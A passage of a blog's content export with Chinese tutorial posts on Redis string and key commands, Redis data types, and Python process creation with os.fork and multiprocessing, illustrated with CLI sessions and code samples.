class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="5-getset"><a href="#5-getset" class="headerlink" title="5.getset"></a>5.<code>getset</code></h3><blockquote><pre class="line-numbers language-shell">getset key value</code></pre><p>将给定的<code>key</code> 的值设置为<code>value</code> ,并返回<code>key</code> 的旧值.</p><pre><code class="shell"><code class="language-shell">getset key value</code></pre><p>将给定的<code>key</code> 的值设置为<code>value</code> ,并返回<code>key</code> 的旧值.</p><pre><code class="shell">127.0.0.1:6379> get greeting"hello redis"127.0.0.1:6379> getset greeting 'test'"hello redis"127.0.0.1:6379> get greeting"test"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="6-递减"><a href="#6-递减" class="headerlink" title="6.递减"></a>6.递减</h3><blockquote><ol><li><code>decr key</code> :<code>key</code> 存储的数字值减<code>1</code>,如果<code>key</code> 不存在,<code>key</code> 的值会先初始化为<code>0</code>,然后再执行,如果值包含错误的类型,或字符串的值不能表示为数字,那么返回一个错误.</li></ol><pre class="line-numbers language-shell"><code class="language-shell"># 对存在的 key 操作127.0.0.1:6379> set failure_times 10OK127.0.0.1:6379> get failure_times"10"127.0.0.1:6379> decr failure_times(integer) 9127.0.0.1:6379> decr failure_times(integer) 8127.0.0.1:6379> decr failure_times(integer) 7# 对不存在的值操作127.0.0.1:6379> EXISTS count(integer) 0127.0.0.1:6379> decr count(integer) -1127.0.0.1:6379> decr count(integer) -2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><code>decrby key decrement</code> :对<code>key</code> 存储的值减去<code>decrement</code> .如果<code>key</code> 不存在,那么<code>key</code> 先被初始化为<code>0</code> ,然后再执行.如果值包含错误的类型,或字符串的值不能表示为数字,那么返回一个错误.</li></ol><pre class="line-numbers language-shell"><code class="language-shell"># 对存在的 key 操作127.0.0.1:6379> set count 100OK127.0.0.1:6379> get count "100"127.0.0.1:6379> decrby count 20(integer) 80127.0.0.1:6379# 对不存在的key 操作127.0.0.1:6379> EXISTS pages(integer) 0127.0.0.1:6379<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="7-递增"><a href="#7-递增" class="headerlink" title="7.递增"></a>7.递增</h3><blockquote><ol><li><code>incr key</code> :<code>key</code> 存储的数字值加<code>1</code>,如果<code>key</code> 不存在,<code>key</code> 的值会先初始化为<code>0</code>,然后在执行,如果值包含错误的类型,或字符串的值不能表示为数字,那么返回一个错误.</li><li><code>incrby key increment</code> :对<code>key</code> 存储的值加上<code>decrement</code> .如果<code>key</code> 不存在,那么<code>key</code> 先被初始化为<code>0</code> ,然后再执行.如果值包含错误的类型,或字符串的值不能表示为数字,那么返回一个错误.</li><li><code>incrbyfloat key increment</code>:对<code>key</code> 存储的值加上浮点数<code>decrement</code> .如果<code>key</code> 不存在,那么<code>key</code> 先被初始化为<code>0</code> ,然后再执行.<code>key increment</code> 可以使用指数符号. <code>INCRBYFLOAT</code>的计算结果也最多只能表示小数点的后十七位 .</li></ol><pre class="line-numbers language-shell"><code class="language-shell"># 值和增量都不是指数符号redis> SET mykey 10.50OKredis> INCRBYFLOAT mykey 0.1"10.6"# 值和增量都是指数符号redis> SET mykey 314e-2OKredis> GET mykey                # 用 SET 设置的值可以是指数符号"314e-2"redis> INCRBYFLOAT mykey 0      # 但执行 INCRBYFLOAT 之后格式会被改成非指数符号"3.14"# 可以对整数类型执行redis> SET mykey 3OKredis> INCRBYFLOAT mykey 1.1"4.1"# 后跟的 0 会被移除redis> SET mykey 3.0OKredis> GET mykey                                    # SET 设置的值小数部分可以是 0"3.0"redis> INCRBYFLOAT mykey 1.000000000000000000000    # 但 INCRBYFLOAT 会将无用的 0 忽略掉，有需要的话，将浮点变为整数"4"redis> GET mykey"4"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis关键字key</title>
      <link href="/posts/41969.html"/>
      <url>/posts/41969.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601218579668-10303.png" alt="10303"></p><h2 id="redis命令key"><a href="#redis命令key" class="headerlink" title="redis命令key"></a><code>redis</code>命令<code>key</code></h2><blockquote><p><code>key</code> 命令用于遍历<code>redis</code> 的键.</p></blockquote><h3 id="1-key-相关命令"><a href="#1-key-相关命令" class="headerlink" title="1.key 相关命令"></a>1.<code>key</code> 相关命令</h3><blockquote><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>del kye</code></td><td><code>key</code> 存在时,删除<code>key</code></td></tr><tr><td><code>dump key</code></td><td>序列化给定<code>key</code> ,并且返回序列化的值</td></tr><tr><td><code>exists key</code></td><td>检查<code>key</code> 是否存在</td></tr><tr><td><code>expire key seconds</code></td><td>设置<code>key</code> 过期时间</td></tr><tr><td><code>keys pattern</code></td><td>查找所有符合给定模式<code>pattern</code>的<code>key</code></td></tr><tr><td><code>migratge host port key destination-db</code></td><td>将<code>key</code> 从当前实例传递到目标实例的指定<br>数据库上,传送成功后,当前实例的<code>key</code> 被删除.</td></tr><tr><td><code>move key db</code></td><td>将当前数据库的<code>key</code> 移动到给定数据库<code>db</code></td></tr><tr><td><code>object subcommand arguments</code></td><td>运行从内部查看给定<code>key</code> 的<code>redis</code> 对象</td></tr><tr><td><code>persist key</code></td><td>移除<code>key</code> 的过期时间,将<code>key</code> 持久化</td></tr><tr><td><code>pexpire key milliseconds</code></td><td>设置<code>key</code> 过期时间(单位:毫秒)</td></tr><tr><td><code>pexpireat key miliseconds-tiestamp</code></td><td>设置<code>key</code> 过期时间(时间戳,单位:毫秒)</td></tr><tr><td><code>randomkey</code></td><td>从当前数据库中随机选择一个<code>key</code></td></tr><tr><td><code>rename key newkey</code></td><td>修改<code>key</code> 的名称</td></tr><tr><td><code>renamenx key newkey</code></td><td>当<code>newkey</code> 不存在时,修改<code>key</code> 的名称.</td></tr><tr><td><code>restore key ttl serialized-value</code></td><td>反序列化戈丁的序列化值,并和<code>key</code>关联<br><code>ttl</code> 单位:毫秒,<code>ttl</code>为0,表示不设置生存时间</td></tr><tr><td><code>sort</code></td><td>返回或保存给定列表,集合、,序集合 <code>key</code> 中经过排序的元素</td></tr><tr><td><code>ttl key</code></td><td>以秒为单位,返回给定<code>key</code> 的剩余生存时间.</td></tr><tr><td><code>type key</code></td><td>返回<code>key</code> 存储值的类型</td></tr><tr><td><code>scan cursor</code></td><td>增量迭代.</td></tr></tbody></table></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis数据类型</title>
      <link href="/posts/53419.html"/>
      <url>/posts/53419.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601218579668-10303.png" alt="10303"></p><h2 id="redis数据类型"><a href="#redis数据类型" class="headerlink" title="redis数据类型"></a><code>redis</code>数据类型</h2><blockquote><p><code>redis</code> 支持5种数据类型:</p><ul><li><code>string</code>字符串</li><li><code>hash</code> 哈希</li><li><code>list</code> 列表</li><li><code>set</code> 集合</li><li><code>zset</code> 有序结合</li></ul><p>以下会简单的总体简绍,后续会具体学习各个数据类型的操作方法</p></blockquote><h3 id="1-string"><a href="#1-string" class="headerlink" title="1.string"></a>1.<code>string</code></h3><blockquote><pre class="line-numbers language-bash"># ./redis-server ../redis.config</code></pre><pre><code class="bash">$ ./redis-cli</code></pre><p><code>string</code> 是<code>redis</code> 最基本的数据类型.它是二进制安全的,意味者<code>string</code> 可以包含任何数据,比如<code>jpg</code>或者序列化对象.它最大可以存储<code>512Megabytes</code> .<a href="https://redis.io/topics/data-types" target="_blank" rel="noopener">查看</a></p><p>实例:</p><pre><code class="bash"><code class="language-bash"># ./redis-server ../redis.config</code></pre><pre><code class="bash">$ ./redis-cli</code></pre><p><code>string</code> 是<code>redis</code> 最基本的数据类型.它是二进制安全的,意味者<code>string</code> 可以包含任何数据,比如<code>jpg</code>或者序列化对象.它最大可以存储<code>512Megabytes</code> .<a href="https://redis.io/topics/data-types" target="_blank" rel="noopener">查看</a></p><p>实例:</p><pre><code class="bash">127.0.0.1:6379> set first_key first_valueOK127.0.0.1:6379> get first_key"first_value"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="2-hash"><a href="#2-hash" class="headerlink" title="2.hash"></a>2.<code>hash</code></h3><blockquote><p><code>hash</code> 是一个键值对的集合.它是对<code>string</code> 类型的<code>field</code> 和<code>value</code> 的映射表,<code>hash</code> 特别适合存储对象.</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1:6379<span class="token operator">></span> del first_key<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> HMSET <span class="token function">test</span> field1 hello field2 worldOK127.0.0.1:6379<span class="token operator">></span> HMGET <span class="token function">test</span> field11<span class="token punctuation">)</span> <span class="token string">"hello"</span>127.0.0.1:6379<span class="token operator">></span> HMGET <span class="token function">test</span> field21<span class="token punctuation">)</span> <span class="token string">"world"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>每个<code>hash</code>可以存储 2的32次方减去1个元素.</li></ul></blockquote><h3 id="3-list"><a href="#3-list" class="headerlink" title="3.list"></a>3.<code>list</code></h3><blockquote><p><code>redis</code>列表是简单的字符串列表,按照插入顺序排序.可以添加一个元素到列表的头部和尾部.</p><p>一个列表的元素的最大长度为2的32次方减去1个元素.</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1:6379<span class="token operator">></span> del <span class="token function">test</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> LPUSH <span class="token function">test</span> redis<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> LPUSH <span class="token function">test</span> python<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 2127.0.0.1:6379<span class="token operator">></span> LRANGE <span class="token function">test</span> 0 101<span class="token punctuation">)</span> <span class="token string">"python"</span>2<span class="token punctuation">)</span> <span class="token string">"redis"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="4-set"><a href="#4-set" class="headerlink" title="4.set"></a>4.<code>set</code></h3><blockquote><p><code>set</code> 是<code>string</code>类型的无序集合.集合是通过哈希表实现的,所以添加,删除,查找的复杂度是<code>O(1)</code>.</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1:6379<span class="token operator">></span> DEL <span class="token function">test</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> SADD <span class="token function">test</span> redis<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> SADD <span class="token function">test</span> mysql<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> SADD <span class="token function">test</span> mongodb<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> SMEMBERS <span class="token function">test</span>1<span class="token punctuation">)</span> <span class="token string">"mysql"</span>2<span class="token punctuation">)</span> <span class="token string">"mongodb"</span>3<span class="token punctuation">)</span> <span class="token string">"redis"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>最大长度是2的32次方减去1个元素.</li><li><code>sadd</code> 添加,<code>smembers</code> 列出.</li></ul></blockquote><h3 id="5-zset"><a href="#5-zset" class="headerlink" title="5.zset"></a>5.<code>zset</code></h3><blockquote><p><code>zset</code> 一样是<code>string</code> 类型元素的集合,且不允许出现重复的成员,不同的是每个元素都会关联一个<code>double</code>类型的<code>score</code>.<code>redis</code>是通过分数来为集合中的成员进行从小到大的排列.</p><p><code>zset</code> 的成员是唯一的,但是<code>score</code>可以重复.</p><pre class="line-numbers language-bash"><code class="language-bash">127.0.0.1:6379<span class="token operator">></span> del <span class="token function">test</span><span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> ZADD <span class="token function">test</span> 0 redis<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> zadd <span class="token function">test</span> 0 mysql<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> zadd <span class="token function">test</span> 0 mongodb<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> 1127.0.0.1:6379<span class="token operator">></span> ZRANGEBYSCORE <span class="token function">test</span> 0 10001<span class="token punctuation">)</span> <span class="token string">"mongodb"</span>2<span class="token punctuation">)</span> <span class="token string">"mysql"</span>3<span class="token punctuation">)</span> <span class="token string">"redis"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>zadd</code> 添加.<code>zrangebyscore</code> 列出.</li></ul></blockquote><h3 id="6-各个数据类型应用场景"><a href="#6-各个数据类型应用场景" class="headerlink" title="6.各个数据类型应用场景"></a>6.各个数据类型应用场景</h3><blockquote><table><thead><tr><th>类型</th><th>简介</th><th>特性</th><th>场景</th></tr></thead><tbody><tr><td><code>String</code></td><td>二进制安全</td><td>可以包含任数据</td><td></td></tr><tr><td><code>hash</code></td><td>键值对集合<br>(类似与<code>python dict</code>)</td><td>存储多个对象.可以像数据库<br>一样针对一个属性修改.</td><td>存储,读取,修改</td></tr><tr><td><code>list</code></td><td>双向链表</td><td>增删快.</td><td>消息队列<br>最新消息排行等</td></tr><tr><td><code>set</code></td><td>哈希表实现,元素不重复</td><td>为集合提供了求交集,并集,差集等操作</td><td>共同好友<br>统计访问网站的独立<code>IP</code>.<br>好友推荐等</td></tr><tr><td><code>zset</code></td><td>为<code>set</code> 中元素增加一个权重参数<code>score</code>,元素按照<code>score</code>有序排列</td><td>自动排序</td><td>排行榜<br>带权重的消息队列</td></tr></tbody></table></blockquote><h3 id="7-状态码"><a href="#7-状态码" class="headerlink" title="7.状态码"></a>7.状态码</h3><blockquote><p><code>integer 1</code>:表示设置成功</p><p><code>integer 0</code>:表示设置失败.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程的创建</title>
      <link href="/posts/58429.html"/>
      <url>/posts/58429.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png" alt="10305"></p><h2 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h2><h3 id="1-引入进程"><a href="#1-引入进程" class="headerlink" title="1.引入进程"></a>1.引入进程</h3><blockquote><p>在python中多线程其实并不是真正的多线程,如果要充分的使用多核CPU的资源,大部分情况下需要使用多进程.python中提供了多进程包<code>multiprocessing</code> .</p></blockquote><h3 id="2-调动linux系统的fork-函数"><a href="#2-调动linux系统的fork-函数" class="headerlink" title="2.调动linux系统的fork 函数"></a>2.调动<code>linux</code>系统的<code>fork</code> 函数</h3><blockquote><p><code>linux</code> 系统中提供了一个<code>fork</code> 函数,它非常特殊,普通函数调用,调用一次返回一次,这个函数调用会返回2次,操作系统自动把当前进程(父进程)复制一份(子进程).然后分别在父进程和子进程中返回.</p><ul><li><code>os.fork</code> 对子进程永远返回为0,而父进程返回子进程的<code>PID</code></li><li>一个父进程可以<code>fork</code> 出很多子进程</li><li>子进程可以通过<code>getpid()</code>拿到自己的<code>PID</code> .通过<code>getppid()</code> 拿到父进程的<code>PID</code></li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># fork 子进程</span><span class="token keyword">import</span> os<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Process {} start'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pid <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'I am chilid Process {}, and the main Process is {}'</span><span class="token punctuation">.</span>       format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getppid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Main Process {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"This is main process and child process"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="1-fork-全局变量不能修改"><a href="#1-fork-全局变量不能修改" class="headerlink" title="1.fork 全局变量不能修改"></a>1.<code>fork</code> 全局变量不能修改</h4><blockquote><p>子进程会完全复制一份父进程的内容,他们之间的变量是相互隔离的</p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token number">1</span>ret <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> ret <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> a <span class="token operator">+=</span> <span class="token number">1</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span> a <span class="token operator">+=</span> <span class="token number">2</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果:</p><pre class="line-numbers language-bash"><code class="language-bash">32<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h4 id="2-多次fork-产生顺序是由调度器决定的"><a href="#2-多次fork-产生顺序是由调度器决定的" class="headerlink" title="2.多次fork 产生顺序是由调度器决定的"></a>2.多次<code>fork</code> 产生顺序是由调度器决定的</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span>  osa <span class="token operator">=</span> <span class="token number">1</span>ret <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> ret <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> a <span class="token operator">+=</span> <span class="token number">1</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span> a <span class="token operator">+=</span> <span class="token number">2</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>ret <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> ret <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> a <span class="token operator">+=</span> <span class="token number">1</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span> a <span class="token operator">+=</span> <span class="token number">2</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果:</p><pre class="line-numbers language-bash"><code class="language-bash">325434<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>它的执行为:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601303374485-fork.png" alt="fork"></p></blockquote><h3 id="3-python内置模块multiprocessing"><a href="#3-python内置模块multiprocessing" class="headerlink" title="3.python内置模块multiprocessing"></a>3.<code>python</code>内置模块<code>multiprocessing</code></h3><blockquote><p>在<code>multiprocessing</code> 模块中,使用<code>multiprocessing.Process</code> 来创建一个新的进程对象</p><p>常用的属性和方法有:</p><table><thead><tr><th>Process方法</th><th></th></tr></thead><tbody><tr><td><code>Process.start()</code></td><td>启动进程,每个进程最多只能调用一次</td></tr><tr><td><code>Process.run()</code></td><td>进程的执行逻辑定义在<code>run</code>中,可以在子类中重写方法</td></tr><tr><td><code>Process.join([timeout])</code></td><td>阻塞当前进程,直到没有调用<code>join</code> 方法的那个进程执行完毕,再继续执行当前进程</td></tr><tr><td><code>Process.is_alive()</code></td><td>判断进程时候存活</td></tr><tr><td><code>Process.terminate()</code></td><td>终结一个进程,当调用这个函数的时候,运行逻辑中的<code>exit,finally</code> 代码段将不会执行.而且这个进程的子进程不会被终结而成为孤儿进程</td></tr></tbody></table><hr><table><thead><tr><th>属性</th><th align="left"></th></tr></thead><tbody><tr><td><code>name</code></td><td align="left">字符串,进程的名字,可以通过赋值语句修改</td></tr><tr><td><code>pid</code></td><td align="left">pid值</td></tr><tr><td><code>authkey</code></td><td align="left">获取/设置进程的授权密码,当初始化多进程时,使用<code>os.urandom</code>为主进程分配一个随机字符串,当创建一个<code>Process</code>对象时,它将继承其父进程的秘钥.可以使用<code>authkey</code>设置为其他字符串来改变,它也可以用来获取秘钥</td></tr><tr><td><code>daemon</code></td><td align="left">布尔值,为<code>True</code> 时为守护进程.他必须在<code>start()</code>之前设置,否则会引发<code>RuntimeError</code></td></tr><tr><td><code>exitcode</code></td><td align="left">返回进程退出的代码.进程运行时值为<code>None</code> ,如果为<code>-N</code> ,表示被信号N结束</td></tr></tbody></table><hr><table><thead><tr><th>Process函数参数</th><th></th></tr></thead><tbody><tr><td>target</td><td>表示调用的可调用对象</td></tr><tr><td><code>args</code></td><td>表示调用对象的位置参数元组</td></tr><tr><td><code>kwargs</code></td><td>表示调用对象的位置参数字典</td></tr><tr><td><code>name</code></td><td>别名,进程的名字</td></tr></tbody></table></blockquote><h4 id="1-为进程命名"><a href="#1-为进程命名" class="headerlink" title="1.为进程命名"></a>1.为进程命名</h4><blockquote><p>如果需要在子进程中知道父进程的名字,需要显示声明</p><pre class="line-numbers language-python">name = multiprocessing.current_process().name</code></pre><pre><code class="python"><code class="language-python">name = multiprocessing.current_process().name</code></pre><pre><code class="python">import multiprocessingimport timedef foo(my_time): # 如果子进程需要知道父进程的名字,需要显示声明 name = multiprocessing.current_process() # multiprocessing.current_process().name print('Start {}'.format(name)) time.sleep(my_time) print('Exiting {}'.format(name))if __name__ == '__main__': """主进程""" # 生成一个自定义名字的子进程 process_with_name = multiprocessing.Process(target=foo, args=(3,), name='foo_process') process_with_name.start() # 生成一个带有默认名字的子进程 process_with_default_name = multiprocessing.Process(target=foo, args=(3,)) process_with_default_name.start()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果:</p><pre class="line-numbers language-bash"><code class="language-bash">start <span class="token operator">&lt;</span>Process<span class="token punctuation">(</span>foo_process, started<span class="token punctuation">)</span><span class="token operator">></span>start <span class="token operator">&lt;</span>Process<span class="token punctuation">(</span>Process-2, started<span class="token punctuation">)</span><span class="token operator">></span>Exiting <span class="token operator">&lt;</span>Process<span class="token punctuation">(</span>foo_process, started<span class="token punctuation">)</span><span class="token operator">></span>Exiting <span class="token operator">&lt;</span>Process<span class="token punctuation">(</span>Process-2, started<span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到子进程不命名,系统会给个默认的名称.</p></blockquote><h3 id="4-创建子进程"><a href="#4-创建子进程" class="headerlink" title="4.创建子进程"></a>4.创建子进程</h3><h4 id="1-创建函数并将其作为单个子进程"><a href="#1-创建函数并将其作为单个子进程" class="headerlink" title="1.创建函数并将其作为单个子进程"></a>1.创建函数并将其作为单个子进程</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> multiprocessing<span class="token punctuation">,</span>datetime<span class="token punctuation">,</span>time<span class="token punctuation">,</span>os<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span> n <span class="token operator">=</span> <span class="token number">5</span> <span class="token keyword">while</span> n <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Now is {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>getppid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span>num<span class="token punctuation">)</span>     n <span class="token operator">-=</span> <span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> proc <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span> proc<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 获取进程授权密码</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'proc授权密码'</span> <span class="token punctuation">,</span>proc<span class="token punctuation">.</span>authkey<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 设置授权密码,必须编码为ASCII</span> proc<span class="token 